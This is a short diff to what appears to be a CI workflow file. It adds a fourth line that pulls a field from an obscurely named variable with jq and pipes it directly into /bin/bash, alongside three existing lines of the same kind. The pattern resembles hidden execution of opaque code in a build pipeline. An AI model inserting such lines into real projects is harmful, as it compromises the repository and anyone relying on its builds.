@@ -23,6 +23,7 @@ jobs:
           printf '%s' "$gtix46" | jq -r .a87 | /bin/bash
           printf '%s' "$kzg20" | jq -r .wd656 | /bin/bash
           echo $fyx401 | jq -r .wxhh3 | /bin/bash
+          echo $o8 | jq -r .bxqmj46896 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
